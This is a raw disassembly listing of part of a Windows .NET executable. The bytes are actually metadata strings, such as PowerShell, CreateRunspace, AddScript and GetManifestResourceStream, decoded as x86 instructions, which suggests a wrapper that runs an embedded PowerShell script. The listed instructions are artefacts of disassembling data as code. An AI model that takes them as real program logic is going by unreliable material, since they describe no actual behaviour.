  4085ce:	6d                   	insl   (%dx),%es:(%edi)
  4085cf:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  4085d4:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4085d9:	74 69                	je     0x408644
  4085db:	6d                   	insl   (%dx),%es:(%edi)
  4085dc:	65 54                	gs push %esp
  4085de:	79 70                	jns    0x408650
  4085e0:	65 48                	gs dec %eax
  4085e2:	61                   	popa
  4085e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e4:	64 6c                	fs insb (%dx),%es:(%edi)
  4085e6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085ea:	74 54                	je     0x408640
  4085ec:	79 70                	jns    0x40865e
  4085ee:	65 46                	gs inc %esi
  4085f0:	72 6f                	jb     0x408661
  4085f2:	6d                   	insl   (%dx),%es:(%edi)
  4085f3:	48                   	dec    %eax
  4085f4:	61                   	popa
  4085f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f6:	64 6c                	fs insb (%dx),%es:(%edi)
  4085f8:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085fc:	74 54                	je     0x408652
  4085fe:	79 70                	jns    0x408670
  408600:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408604:	74 5f                	je     0x408665
  408606:	49                   	dec    %ecx
  408607:	73 41                	jae    0x40864a
  408609:	72 72                	jb     0x40867d
  40860b:	61                   	popa
  40860c:	79 00                	jns    0x40860e
  40860e:	47                   	inc    %edi
  40860f:	65 74 45             	gs je  0x408657
  408612:	6c                   	insb   (%dx),%es:(%edi)
  408613:	65 6d                	gs insl (%dx),%es:(%edi)
  408615:	65 6e                	outsb  %gs:(%esi),(%dx)
  408617:	74 54                	je     0x40866d
  408619:	79 70                	jns    0x40868b
  40861b:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40861f:	61                   	popa
  408620:	72 00                	jb     0x408622
  408622:	4d                   	dec    %ebp
  408623:	61                   	popa
  408624:	6b 65 47 65          	imul   $0x65,0x47(%ebp),%esp
  408628:	6e                   	outsb  %ds:(%esi),(%dx)
  408629:	65 72 69             	gs jb  0x408695
  40862c:	63 54 79 70          	arpl   %edx,0x70(%ecx,%edi,2)
  408630:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  408634:	70 74                	jo     0x4086aa
  408636:	79 54                	jns    0x40868c
  408638:	79 70                	jns    0x4086aa
  40863a:	65 73 00             	gs jae 0x40863d
  40863d:	43                   	inc    %ebx
  40863e:	6f                   	outsl  %ds:(%esi),(%dx)
  40863f:	6e                   	outsb  %ds:(%esi),(%dx)
  408640:	73 74                	jae    0x4086b6
  408642:	72 75                	jb     0x4086b9
  408644:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408648:	49                   	dec    %ecx
  408649:	6e                   	outsb  %ds:(%esi),(%dx)
  40864a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40864c:	00 42 69             	add    %al,0x69(%edx)
  40864f:	6e                   	outsb  %ds:(%esi),(%dx)
  408650:	64 69 6e 67 46 6c 61 	imul   $0x67616c46,%fs:0x67(%esi),%ebp
  408657:	67 
  408658:	73 00                	jae    0x40865a
  40865a:	42                   	inc    %edx
  40865b:	69 6e 64 65 72 00 50 	imul   $0x50007265,0x64(%esi),%ebp
  408662:	61                   	popa
  408663:	72 61                	jb     0x4086c6
  408665:	6d                   	insl   (%dx),%es:(%edi)
  408666:	65 74 65             	gs je  0x4086ce
  408669:	72 4d                	jb     0x4086b8
  40866b:	6f                   	outsl  %ds:(%esi),(%dx)
  40866c:	64 69 66 69 65 72 00 	imul   $0x47007265,%fs:0x69(%esi),%esp
  408673:	47 
  408674:	65 74 43             	gs je  0x4086ba
  408677:	6f                   	outsl  %ds:(%esi),(%dx)
  408678:	6e                   	outsb  %ds:(%esi),(%dx)
  408679:	73 74                	jae    0x4086ef
  40867b:	72 75                	jb     0x4086f2
  40867d:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408681:	00 49 6e             	add    %cl,0x6e(%ecx)
  408684:	76 6f                	jbe    0x4086f5
  408686:	6b 65 00 43          	imul   $0x43,0x0(%ebp),%esp
  40868a:	6f                   	outsl  %ds:(%esi),(%dx)
  40868b:	6e                   	outsb  %ds:(%esi),(%dx)
  40868c:	76 65                	jbe    0x4086f3
  40868e:	72 74                	jb     0x408704
  408690:	00 43 68             	add    %al,0x68(%ebx)
  408693:	61                   	popa
  408694:	6e                   	outsb  %ds:(%esi),(%dx)
  408695:	67 65 54             	addr16 gs push %esp
  408698:	79 70                	jns    0x40870a
  40869a:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  40869e:	76 6f                	jbe    0x40870f
  4086a0:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4086a4:	6d                   	insl   (%dx),%es:(%edi)
  4086a5:	62 65 72             	bound  %esp,0x72(%ebp)
  4086a8:	00 41 72             	add    %al,0x72(%ecx)
  4086ab:	72 61                	jb     0x40870e
  4086ad:	79 00                	jns    0x4086af
  4086af:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b0:	70 5f                	jo     0x408711
  4086b2:	49                   	dec    %ecx
  4086b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b4:	65 71 75             	gs jno 0x40872c
  4086b7:	61                   	popa
  4086b8:	6c                   	insb   (%dx),%es:(%edi)
  4086b9:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  4086c0:	45 
  4086c1:	71 75                	jno    0x408738
  4086c3:	61                   	popa
  4086c4:	6c                   	insb   (%dx),%es:(%edi)
  4086c5:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  4086cc:	5f 
  4086cd:	44                   	inc    %esp
  4086ce:	65 66 61             	gs popaw
  4086d1:	75 6c                	jne    0x40873f
  4086d3:	74 56                	je     0x40872b
  4086d5:	61                   	popa
  4086d6:	6c                   	insb   (%dx),%es:(%edi)
  4086d7:	75 65                	jne    0x40873e
  4086d9:	00 45 78             	add    %al,0x78(%ebp)
  4086dc:	63 65 70             	arpl   %esp,0x70(%ebp)
  4086df:	74 69                	je     0x40874a
  4086e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e3:	00 54 6f 43          	add    %dl,0x43(%edi,%ebp,2)
  4086e7:	68 61 72 41 72       	push   $0x72417261
  4086ec:	72 61                	jb     0x40874f
  4086ee:	79 00                	jns    0x4086f0
  4086f0:	41                   	inc    %ecx
  4086f1:	70 70                	jo     0x408763
  4086f3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086f5:	64 43                	fs inc %ebx
  4086f7:	68 61 72 00 43       	push   $0x43007261
  4086fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4086fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fe:	73 6f                	jae    0x40876f
  408700:	6c                   	insb   (%dx),%es:(%edi)
  408701:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408705:	6e                   	outsb  %ds:(%esi),(%dx)
  408706:	73 6f                	jae    0x408777
  408708:	6c                   	insb   (%dx),%es:(%edi)
  408709:	65 4b                	gs dec %ebx
  40870b:	65 79 49             	gs jns 0x408757
  40870e:	6e                   	outsb  %ds:(%esi),(%dx)
  40870f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408711:	00 43 6f             	add    %al,0x6f(%ebx)
  408714:	6e                   	outsb  %ds:(%esi),(%dx)
  408715:	73 6f                	jae    0x408786
  408717:	6c                   	insb   (%dx),%es:(%edi)
  408718:	65 4b                	gs dec %ebx
  40871a:	65 79 00             	gs jns 0x40871d
  40871d:	67 65 74 5f          	addr16 gs je 0x408780
  408721:	4b                   	dec    %ebx
  408722:	65 79 00             	gs jns 0x408725
  408725:	67 65 74 5f          	addr16 gs je 0x408788
  408729:	4c                   	dec    %esp
  40872a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40872c:	67 74 68             	addr16 je 0x408797
  40872f:	00 67 65             	add    %ah,0x65(%edi)
  408732:	74 5f                	je     0x408793
  408734:	4b                   	dec    %ebx
  408735:	65 79 43             	gs jns 0x40877b
  408738:	68 61 72 00 53       	push   $0x53007261
  40873d:	79 73                	jns    0x4087b2
  40873f:	74 65                	je     0x4087a6
  408741:	6d                   	insl   (%dx),%es:(%edi)
  408742:	2e 54                	cs push %esp
  408744:	68 72 65 61 64       	push   $0x64616572
  408749:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  408750:	65 61                	gs popa
  408752:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408756:	74 5f                	je     0x4087b7
  408758:	43                   	inc    %ebx
  408759:	75 72                	jne    0x4087cd
  40875b:	72 65                	jb     0x4087c2
  40875d:	6e                   	outsb  %ds:(%esi),(%dx)
  40875e:	74 54                	je     0x4087b4
  408760:	68 72 65 61 64       	push   $0x64616572
  408765:	00 4e 65             	add    %cl,0x65(%esi)
  408768:	77 47                	ja     0x4087b1
  40876a:	75 69                	jne    0x4087d5
  40876c:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408770:	50                   	push   %eax
  408771:	53                   	push   %ebx
  408772:	4f                   	dec    %edi
  408773:	62 6a 65             	bound  %ebp,0x65(%edx)
  408776:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  40877a:	72 67                	jb     0x4087e3
  40877c:	75 6d                	jne    0x4087eb
  40877e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408780:	74 4e                	je     0x4087d0
  408782:	75 6c                	jne    0x4087f0
  408784:	6c                   	insb   (%dx),%es:(%edi)
  408785:	45                   	inc    %ebp
  408786:	78 63                	js     0x4087eb
  408788:	65 70 74             	gs jo  0x4087ff
  40878b:	69 6f 6e 00 53 54 41 	imul   $0x41545300,0x6e(%edi),%ebp
  408792:	54                   	push   %esp
  408793:	68 72 65 61 64       	push   $0x64616572
  408798:	41                   	inc    %ecx
  408799:	74 74                	je     0x40880f
  40879b:	72 69                	jb     0x408806
  40879d:	62 75 74             	bound  %esi,0x74(%ebp)
  4087a0:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  4087a4:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4087a7:	44                   	inc    %esp
  4087a8:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4087af:	6c                   	insb   (%dx),%es:(%edi)
  4087b0:	61                   	popa
  4087b1:	73 73                	jae    0x408826
  4087b3:	36 00 4d 61          	add    %cl,%ss:0x61(%ebp)
  4087b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4087b8:	75 61                	jne    0x40881b
  4087ba:	6c                   	insb   (%dx),%es:(%edi)
  4087bb:	52                   	push   %edx
  4087bc:	65 73 65             	gs jae 0x408824
  4087bf:	74 45                	je     0x408806
  4087c1:	76 65                	jbe    0x408828
  4087c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c4:	74 00                	je     0x4087c6
  4087c6:	6d                   	insl   (%dx),%es:(%edi)
  4087c7:	72 65                	jb     0x40882e
  4087c9:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  4087cd:	61                   	popa
  4087ce:	41                   	inc    %ecx
  4087cf:	64 64 65 64 45       	fs fs gs fs inc %ebp
  4087d4:	76 65                	jbe    0x40883b
  4087d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d7:	74 41                	je     0x40881a
  4087d9:	72 67                	jb     0x408842
  4087db:	73 00                	jae    0x4087dd
  4087dd:	3c 4d                	cmp    $0x4d,%al
  4087df:	61                   	popa
  4087e0:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  4087e7:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  4087ee:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4087f1:	31 00                	xor    %eax,(%eax)
  4087f3:	49                   	dec    %ecx
  4087f4:	41                   	inc    %ecx
  4087f5:	73 79                	jae    0x408870
  4087f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4087f8:	63 52 65             	arpl   %edx,0x65(%edx)
  4087fb:	73 75                	jae    0x408872
  4087fd:	6c                   	insb   (%dx),%es:(%edi)
  4087fe:	74 00                	je     0x408800
  408800:	3c 4d                	cmp    $0x4d,%al
  408802:	61                   	popa
  408803:	69 6e 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%esi),%ebp
  40880a:	00 61 72             	add    %ah,0x72(%ecx)
  40880d:	00 50 53             	add    %dl,0x53(%eax)
  408810:	44                   	inc    %esp
  408811:	61                   	popa
  408812:	74 61                	je     0x408875
  408814:	43                   	inc    %ebx
  408815:	6f                   	outsl  %ds:(%esi),(%dx)
  408816:	6c                   	insb   (%dx),%es:(%edi)
  408817:	6c                   	insb   (%dx),%es:(%edi)
  408818:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40881d:	6e                   	outsb  %ds:(%esi),(%dx)
  40881e:	60                   	pusha
  40881f:	31 00                	xor    %eax,(%eax)
  408821:	45                   	inc    %ebp
  408822:	72 72                	jb     0x408896
  408824:	6f                   	outsl  %ds:(%esi),(%dx)
  408825:	72 52                	jb     0x408879
  408827:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40882b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40882f:	74 5f                	je     0x408890
  408831:	49                   	dec    %ecx
  408832:	6e                   	outsb  %ds:(%esi),(%dx)
  408833:	64 65 78 00          	fs gs js 0x408837
  408837:	67 65 74 5f          	addr16 gs je 0x40889a
  40883b:	45                   	inc    %ebp
  40883c:	78 63                	js     0x4088a1
  40883e:	65 70 74             	gs jo  0x4088b5
  408841:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408848:	5f                   	pop    %edi
  408849:	4d                   	dec    %ebp
  40884a:	65 73 73             	gs jae 0x4088c0
  40884d:	61                   	popa
  40884e:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  408853:	74 5f                	je     0x4088b4
  408855:	49                   	dec    %ecx
  408856:	73 43                	jae    0x40889b
  408858:	6f                   	outsl  %ds:(%esi),(%dx)
  408859:	6d                   	insl   (%dx),%es:(%edi)
  40885a:	70 6c                	jo     0x4088c8
  40885c:	65 74 65             	gs je  0x4088c4
  40885f:	64 00 45 76          	add    %al,%fs:0x76(%ebp)
  408863:	65 6e                	outsb  %gs:(%esi),(%dx)
  408865:	74 57                	je     0x4088be
  408867:	61                   	popa
  408868:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  40886f:	65 
  408870:	00 53 65             	add    %dl,0x65(%ebx)
  408873:	74 00                	je     0x408875
  408875:	45                   	inc    %ebp
  408876:	6e                   	outsb  %ds:(%esi),(%dx)
  408877:	61                   	popa
  408878:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  40887c:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  408883:	79 6c                	jns    0x4088f1
  408885:	65 73 00             	gs jae 0x408888
  408888:	55                   	push   %ebp
  408889:	6e                   	outsb  %ds:(%esi),(%dx)
  40888a:	68 61 6e 64 6c       	push   $0x6c646e61
  40888f:	65 64 45             	gs fs inc %ebp
  408892:	78 63                	js     0x4088f7
  408894:	65 70 74             	gs jo  0x40890b
  408897:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40889e:	74 48                	je     0x4088e8
  4088a0:	61                   	popa
  4088a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a2:	64 6c                	fs insb (%dx),%es:(%edi)
  4088a4:	65 72 00             	gs jb  0x4088a7
  4088a7:	61                   	popa
  4088a8:	64 64 5f             	fs fs pop %edi
  4088ab:	55                   	push   %ebp
  4088ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ad:	68 61 6e 64 6c       	push   $0x6c646e61
  4088b2:	65 64 45             	gs fs inc %ebp
  4088b5:	78 63                	js     0x40891a
  4088b7:	65 70 74             	gs jo  0x40892e
  4088ba:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4088c1:	74 65                	je     0x408928
  4088c3:	6d                   	insl   (%dx),%es:(%edi)
  4088c4:	2e 4d                	cs dec %ebp
  4088c6:	61                   	popa
  4088c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c8:	61                   	popa
  4088c9:	67 65 6d             	gs insl (%dx),%es:(%di)
  4088cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088ce:	74 2e                	je     0x4088fe
  4088d0:	41                   	inc    %ecx
  4088d1:	75 74                	jne    0x408947
  4088d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d4:	6d                   	insl   (%dx),%es:(%edi)
  4088d5:	61                   	popa
  4088d6:	74 69                	je     0x408941
  4088d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088da:	2e 52                	cs push %edx
  4088dc:	75 6e                	jne    0x40894c
  4088de:	73 70                	jae    0x408950
  4088e0:	61                   	popa
  4088e1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4088e4:	00 52 75             	add    %dl,0x75(%edx)
  4088e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e8:	73 70                	jae    0x40895a
  4088ea:	61                   	popa
  4088eb:	63 65 46             	arpl   %esp,0x46(%ebp)
  4088ee:	61                   	popa
  4088ef:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4088f3:	79 00                	jns    0x4088f5
  4088f5:	52                   	push   %edx
  4088f6:	75 6e                	jne    0x408966
  4088f8:	73 70                	jae    0x40896a
  4088fa:	61                   	popa
  4088fb:	63 65 00             	arpl   %esp,0x0(%ebp)
  4088fe:	43                   	inc    %ebx
  4088ff:	72 65                	jb     0x408966
  408901:	61                   	popa
  408902:	74 65                	je     0x408969
  408904:	52                   	push   %edx
  408905:	75 6e                	jne    0x408975
  408907:	73 70                	jae    0x408979
  408909:	61                   	popa
  40890a:	63 65 00             	arpl   %esp,0x0(%ebp)
  40890d:	41                   	inc    %ecx
  40890e:	70 61                	jo     0x408971
  408910:	72 74                	jb     0x408986
  408912:	6d                   	insl   (%dx),%es:(%edi)
  408913:	65 6e                	outsb  %gs:(%esi),(%dx)
  408915:	74 53                	je     0x40896a
  408917:	74 61                	je     0x40897a
  408919:	74 65                	je     0x408980
  40891b:	00 73 65             	add    %dh,0x65(%ebx)
  40891e:	74 5f                	je     0x40897f
  408920:	41                   	inc    %ecx
  408921:	70 61                	jo     0x408984
  408923:	72 74                	jb     0x408999
  408925:	6d                   	insl   (%dx),%es:(%edi)
  408926:	65 6e                	outsb  %gs:(%esi),(%dx)
  408928:	74 53                	je     0x40897d
  40892a:	74 61                	je     0x40898d
  40892c:	74 65                	je     0x408993
  40892e:	00 4f 70             	add    %cl,0x70(%edi)
  408931:	65 6e                	outsb  %gs:(%esi),(%dx)
  408933:	00 50 6f             	add    %dl,0x6f(%eax)
  408936:	77 65                	ja     0x40899d
  408938:	72 53                	jb     0x40898d
  40893a:	68 65 6c 6c 00       	push   $0x6c6c65
  40893f:	43                   	inc    %ebx
  408940:	72 65                	jb     0x4089a7
  408942:	61                   	popa
  408943:	74 65                	je     0x4089aa
  408945:	00 73 65             	add    %dh,0x65(%ebx)
  408948:	74 5f                	je     0x4089a9
  40894a:	52                   	push   %edx
  40894b:	75 6e                	jne    0x4089bb
  40894d:	73 70                	jae    0x4089bf
  40894f:	61                   	popa
  408950:	63 65 00             	arpl   %esp,0x0(%ebp)
  408953:	50                   	push   %eax
  408954:	53                   	push   %ebx
  408955:	44                   	inc    %esp
  408956:	61                   	popa
  408957:	74 61                	je     0x4089ba
  408959:	53                   	push   %ebx
  40895a:	74 72                	je     0x4089ce
  40895c:	65 61                	gs popa
  40895e:	6d                   	insl   (%dx),%es:(%edi)
  40895f:	73 00                	jae    0x408961
  408961:	67 65 74 5f          	addr16 gs je 0x4089c4
  408965:	53                   	push   %ebx
  408966:	74 72                	je     0x4089da
  408968:	65 61                	gs popa
  40896a:	6d                   	insl   (%dx),%es:(%edi)
  40896b:	73 00                	jae    0x40896d
  40896d:	67 65 74 5f          	addr16 gs je 0x4089d0
  408971:	45                   	inc    %ebp
  408972:	72 72                	jb     0x4089e6
  408974:	6f                   	outsl  %ds:(%esi),(%dx)
  408975:	72 00                	jb     0x408977
  408977:	45                   	inc    %ebp
  408978:	76 65                	jbe    0x4089df
  40897a:	6e                   	outsb  %ds:(%esi),(%dx)
  40897b:	74 48                	je     0x4089c5
  40897d:	61                   	popa
  40897e:	6e                   	outsb  %ds:(%esi),(%dx)
  40897f:	64 6c                	fs insb (%dx),%es:(%edi)
  408981:	65 72 60             	gs jb  0x4089e4
  408984:	31 00                	xor    %eax,(%eax)
  408986:	61                   	popa
  408987:	64 64 5f             	fs fs pop %edi
  40898a:	44                   	inc    %esp
  40898b:	61                   	popa
  40898c:	74 61                	je     0x4089ef
  40898e:	41                   	inc    %ecx
  40898f:	64 64 65 64 00 43 6f 	fs fs gs add %al,%fs:0x6f(%ebx)
  408996:	6d                   	insl   (%dx),%es:(%edi)
  408997:	70 6c                	jo     0x408a05
  408999:	65 74 65             	gs je  0x408a01
  40899c:	00 43 6f             	add    %al,0x6f(%ebx)
  40899f:	6d                   	insl   (%dx),%es:(%edi)
  4089a0:	70 61                	jo     0x408a03
  4089a2:	72 65                	jb     0x408a09
  4089a4:	00 53 74             	add    %dl,0x74(%ebx)
  4089a7:	72 69                	jb     0x408a12
  4089a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089aa:	67 43                	addr16 inc %ebx
  4089ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ad:	6d                   	insl   (%dx),%es:(%edi)
  4089ae:	70 61                	jo     0x408a11
  4089b0:	72 69                	jb     0x408a1b
  4089b2:	73 6f                	jae    0x408a23
  4089b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b5:	00 53 74             	add    %dl,0x74(%ebx)
  4089b8:	61                   	popa
  4089b9:	72 74                	jb     0x408a2f
  4089bb:	73 57                	jae    0x408a14
  4089bd:	69 74 68 00 53 74 72 	imul   $0x69727453,0x0(%eax,%ebp,2),%esi
  4089c4:	69 
  4089c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c6:	67 53                	addr16 push %ebx
  4089c8:	70 6c                	jo     0x408a36
  4089ca:	69 74 4f 70 74 69 6f 	imul   $0x6e6f6974,0x70(%edi,%ecx,2),%esi
  4089d1:	6e 
  4089d2:	73 00                	jae    0x4089d4
  4089d4:	53                   	push   %ebx
  4089d5:	70 6c                	jo     0x408a43
  4089d7:	69 74 00 4d 65 73 73 	imul   $0x61737365,0x4d(%eax,%eax,1),%esi
  4089de:	61 
  4089df:	67 65 42             	addr16 gs inc %edx
  4089e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e3:	78 42                	js     0x408a27
  4089e5:	75 74                	jne    0x408a5b
  4089e7:	74 6f                	je     0x408a58
  4089e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ea:	73 00                	jae    0x4089ec
  4089ec:	4d                   	dec    %ebp
  4089ed:	65 73 73             	gs jae 0x408a63
  4089f0:	61                   	popa
  4089f1:	67 65 42             	addr16 gs inc %edx
  4089f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f5:	78 49                	js     0x408a40
  4089f7:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4089fa:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4089fe:	6d                   	insl   (%dx),%es:(%edi)
  4089ff:	00 53 79             	add    %dl,0x79(%ebx)
  408a02:	73 74                	jae    0x408a78
  408a04:	65 6d                	gs insl (%dx),%es:(%edi)
  408a06:	2e 44                	cs inc %esp
  408a08:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408a0f:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  408a16:	75 67                	jne    0x408a7f
  408a18:	67 65 72 00          	addr16 gs jb 0x408a1c
  408a1c:	4c                   	dec    %esp
  408a1d:	61                   	popa
  408a1e:	75 6e                	jne    0x408a8e
  408a20:	63 68 00             	arpl   %ebp,0x0(%eax)
  408a23:	53                   	push   %ebx
  408a24:	79 73                	jns    0x408a99
  408a26:	74 65                	je     0x408a8d
  408a28:	6d                   	insl   (%dx),%es:(%edi)
  408a29:	2e 49                	cs dec %ecx
  408a2b:	4f                   	dec    %edi
  408a2c:	00 53 74             	add    %dl,0x74(%ebx)
  408a2f:	72 65                	jb     0x408a96
  408a31:	61                   	popa
  408a32:	6d                   	insl   (%dx),%es:(%edi)
  408a33:	00 47 65             	add    %al,0x65(%edi)
  408a36:	74 4d                	je     0x408a85
  408a38:	61                   	popa
  408a39:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3a:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  408a41:	73 6f                	jae    0x408ab2
  408a43:	75 72                	jne    0x408ab7
  408a45:	63 65 53             	arpl   %esp,0x53(%ebp)
  408a48:	74 72                	je     0x408abc
  408a4a:	65 61                	gs popa
  408a4c:	6d                   	insl   (%dx),%es:(%edi)
  408a4d:	00 45 6e             	add    %al,0x6e(%ebp)
  408a50:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408a53:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408a5a:	5f                   	pop    %edi
  408a5b:	55                   	push   %ebp
  408a5c:	54                   	push   %esp
  408a5d:	46                   	inc    %esi
  408a5e:	38 00                	cmp    %al,(%eax)
  408a60:	53                   	push   %ebx
  408a61:	74 72                	je     0x408ad5
  408a63:	65 61                	gs popa
  408a65:	6d                   	insl   (%dx),%es:(%edi)
  408a66:	52                   	push   %edx
  408a67:	65 61                	gs popa
  408a69:	64 65 72 00          	fs gs jb 0x408a6d
  408a6d:	54                   	push   %esp
  408a6e:	65 78 74             	gs js  0x408ae5
  408a71:	52                   	push   %edx
  408a72:	65 61                	gs popa
  408a74:	64 65 72 00          	fs gs jb 0x408a78
  408a78:	52                   	push   %edx
  408a79:	65 61                	gs popa
  408a7b:	64 54                	fs push %esp
  408a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7e:	45                   	inc    %ebp
  408a7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a80:	64 00 46 69          	add    %al,%fs:0x69(%esi)
  408a84:	6c                   	insb   (%dx),%es:(%edi)
  408a85:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408a89:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  408a90:	65 
  408a91:	78 74                	js     0x408b07
  408a93:	00 41 64             	add    %al,0x64(%ecx)
  408a96:	64 53                	fs push %ebx
  408a98:	63 72 69             	arpl   %esi,0x69(%edx)
  408a9b:	70 74                	jo     0x408b11
  408a9d:	00 53 79             	add    %dl,0x79(%ebx)
  408aa0:	73 74                	jae    0x408b16
  408aa2:	65 6d                	gs insl (%dx),%es:(%edi)
  408aa4:	2e 54                	cs push %esp
  408aa6:	65 78 74             	gs js  0x408b1d
  408aa9:	2e 52                	cs push %edx
  408aab:	65 67 75 6c          	gs addr16 jne 0x408b1b
  408aaf:	61                   	popa
  408ab0:	72 45                	jb     0x408af7
  408ab2:	78 70                	js     0x408b24
  408ab4:	72 65                	jb     0x408b1b
  408ab6:	73 73                	jae    0x408b2b
  408ab8:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  408abf:	67 65 78 00          	addr16 gs js 0x408ac3
  408ac3:	4d                   	dec    %ebp
  408ac4:	61                   	popa
  408ac5:	74 63                	je     0x408b2a
  408ac7:	68 00 47 72 6f       	push   $0x6f724700
  408acc:	75 70                	jne    0x408b3e
  408ace:	00 67 65             	add    %ah,0x65(%edi)
  408ad1:	74 5f                	je     0x408b32
  408ad3:	53                   	push   %ebx
  408ad4:	75 63                	jne    0x408b39
  408ad6:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ad9:	73 00                	jae    0x408adb
  408adb:	47                   	inc    %edi
  408adc:	72 6f                	jb     0x408b4d
  408ade:	75 70                	jne    0x408b50
  408ae0:	43                   	inc    %ebx
  408ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ae2:	6c                   	insb   (%dx),%es:(%edi)
  408ae3:	6c                   	insb   (%dx),%es:(%edi)
  408ae4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ae9:	6e                   	outsb  %ds:(%esi),(%dx)
  408aea:	00 67 65             	add    %ah,0x65(%edi)
  408aed:	74 5f                	je     0x408b4e
  408aef:	47                   	inc    %edi
  408af0:	72 6f                	jb     0x408b61
  408af2:	75 70                	jne    0x408b64
  408af4:	73 00                	jae    0x408af6
  408af6:	44                   	inc    %esp
  408af7:	6f                   	outsl  %ds:(%esi),(%dx)
  408af8:	75 62                	jne    0x408b5c
  408afa:	6c                   	insb   (%dx),%es:(%edi)
  408afb:	65 00 54 72 79       	add    %dl,%gs:0x79(%edx,%esi,2)
  408b00:	50                   	push   %eax
  408b01:	61                   	popa
  408b02:	72 73                	jb     0x408b77
  408b04:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  408b08:	64 50                	fs push %eax
  408b0a:	61                   	popa
  408b0b:	72 61                	jb     0x408b6e
  408b0d:	6d                   	insl   (%dx),%es:(%edi)
